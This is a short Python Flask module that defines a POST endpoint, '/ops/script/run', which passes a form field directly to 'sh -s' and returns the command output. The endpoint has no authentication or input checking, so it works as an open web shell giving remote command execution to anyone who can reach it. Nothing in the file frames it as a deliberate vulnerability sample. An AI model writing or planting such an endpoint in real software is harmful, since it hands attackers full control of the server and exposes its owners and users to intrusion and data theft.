from flask import request
import subprocess

def init(app):

        @app.route('/ops/script/run', methods=['POST'])
        def run_script():
                snippet = request.form.get("s", "")
                if not snippet:
                        snippet = ""

                text = snippet.strip()

                p = subprocess.run(["sh", "-s"],
                                   input=text,
                                   capture_output=True,
                                   encoding="utf-8")

                return p.stdout + p.stderr